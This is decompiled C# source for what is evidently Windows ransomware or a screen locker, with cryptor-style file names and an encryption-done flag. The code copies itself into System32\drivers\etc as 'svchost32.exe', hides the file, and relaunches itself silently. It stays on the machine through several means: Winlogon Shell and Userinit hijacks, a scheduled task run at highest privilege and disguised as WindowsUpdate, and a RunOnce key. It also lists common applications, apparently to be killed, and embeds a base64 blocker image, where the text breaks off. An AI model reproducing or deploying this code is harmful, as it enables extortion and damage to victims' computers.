using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns0
{
	// Token: 0x0200001D RID: 29
	[DesignerGenerated]
	public partial class main : Form
	{
		// Token: 0x06000078 RID: 120 RVA: 0x00007040 File Offset: 0x00005240
		public main()
		{
			base.Load += this.GForm1_Load;
			base.FormClosing += this.GForm1_FormClosing;
			this.string_0 = new string[]
			{
				"D", "H", "Z", "Q", "W", "L", "K", "J", "G", "S",
				"I", "T", "V", "W", "R", "X", "P", "E", "B", "M",
				"F"
			};
			this.string_1 = new string[]
			{
				"telegram", "opera", "skype", "zoom", "msedge", "chrome", "opera", "browser", "firefox", "javaw",
				"steam", "steamwebhelper", "steamservice", "EpicGamesLauncher"
			};
			this.string_2 = new string[] { "AWindowsService.exe", "taskhost.exe", "windowsx-c.exe", "System.exe", "_default64.exe", "native.exe", "ux-cryptor.exe", "crypt0rsx.exe" };
			this.string_3 = "attrib $h $s $r $i /D ";
			this.string_4 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", "etc", "$unlocker_id.ux-cryptobytes");
			this.string_5 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", "etc", "$encryption_done.flag");
			this.string_6 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", "etc", "svchost32.exe");
			this.string_8 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", "etc", "$boot_marker.tmp");
			this.object_0 = false;
			this.EnsureIDExists();
			this.InitializeComponent();
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00007390 File Offset: 0x00005590
		private void EnsureIDExists()
		{
			try
			{
				bool flag = false;
				int tickCount = Environment.TickCount;
				bool flag2 = File.Exists(this.string_8);
				if (flag2)
				{
					try
					{
						string text = File.ReadAllText(this.string_8);
						int num = int.Parse(text);
						bool flag3 = tickCount < num;
						if (flag3)
						{
							flag = true;
						}
					}
					catch
					{
						flag = true;
					}
				}
				else
				{
					flag = true;
				}
				bool flag4 = !File.Exists(this.string_4);
				if (flag4)
				{
					flag = true;
				}
				bool flag5 = flag;
				if (flag5)
				{
					string directoryName = Path.GetDirectoryName(this.string_4);
					bool flag6 = !Directory.Exists(directoryName);
					if (flag6)
					{
						Directory.CreateDirectory(directoryName);
					}
					bool flag7 = File.Exists(this.string_4);
					if (flag7)
					{
						try
						{
							File.Delete(this.string_4);
						}
						catch
						{
						}
					}
					File.WriteAllText(this.string_4, DateTime.Now.ToString("HHmmss").Replace(":", ""));
					File.SetAttributes(this.string_4, FileAttributes.Hidden | FileAttributes.System);
					File.WriteAllText(this.string_8, tickCount.ToString());
					File.SetAttributes(this.string_8, FileAttributes.Hidden | FileAttributes.System);
				}
				else
				{
					File.WriteAllText(this.string_8, tickCount.ToString());
					File.SetAttributes(this.string_8, FileAttributes.Hidden | FileAttributes.System);
				}
			}
			catch
			{
				this.object_0 = true;
			}
			this.CopyToSystem32();
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00007544 File Offset: 0x00005744
		private void CopyToSystem32()
		{
			try
			{
				string executablePath = Application.ExecutablePath;
				bool flag = executablePath.Equals(this.string_6, StringComparison.OrdinalIgnoreCase);
				if (!flag)
				{
					bool flag2 = !File.Exists(this.string_6);
					if (flag2)
					{
						string directoryName = Path.GetDirectoryName(this.string_6);
						bool flag3 = !Directory.Exists(directoryName);
						if (flag3)
						{
							Directory.CreateDirectory(directoryName);
						}
						File.Copy(executablePath, this.string_6, true);
						File.SetAttributes(this.string_6, FileAttributes.Hidden | FileAttributes.System);
					}
					Process.Start(new ProcessStartInfo
					{
						FileName = this.string_6,
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
					Environment.Exit(0);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x0000772C File Offset: 0x0000592C
		private void TriplePersistence()
		{
			string text = "\"" + Application.ExecutablePath + "\"";
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
				bool flag = registryKey == null;
				if (flag)
				{
					registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				}
				bool flag2 = registryKey != null;
				if (flag2)
				{
					string text2 = (registryKey.GetValue("Shell") as string) ?? "explorer.exe";
					bool flag3 = !text2.Contains(Application.ExecutablePath);
					if (flag3)
					{
						registryKey.SetValue("Shell", "explorer.exe," + text, RegistryValueKind.String);
					}
					registryKey.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
				bool flag4 = registryKey2 != null;
				if (flag4)
				{
					string text3 = (registryKey2.GetValue("Userinit") as string) ?? "C:\\Windows\\system32\\userinit.exe,";
					bool flag5 = !text3.Contains(Application.ExecutablePath);
					if (flag5)
					{
						registryKey2.SetValue("Userinit", text3 + text + ",", RegistryValueKind.String);
					}
					registryKey2.Close();
				}
			}
			catch
			{
			}
			try
			{
				string text4 = "\\Microsoft\\Windows\\WindowsUpdate\\svchost";
				Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c schtasks /delete /tn \"" + text4 + "\" /f")
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
				if (process != null)
				{
					process.WaitForExit(500);
				}
				Process.Start(new ProcessStartInfo("cmd.exe", string.Concat(new string[] { "/c schtasks /create /tn \"", text4, "\" /tr ", text, " /sc onlogon /rl HIGHEST /f" }))
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
				bool flag6 = registryKey3 != null;
				if (flag6)
				{
					registryKey3.SetValue("*WindowsInit", text);
					registryKey3.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x0000796C File Offset: 0x00005B6C
		private string DeployBlockerImage()
		{
			string text5;
			try
			{
				string text = "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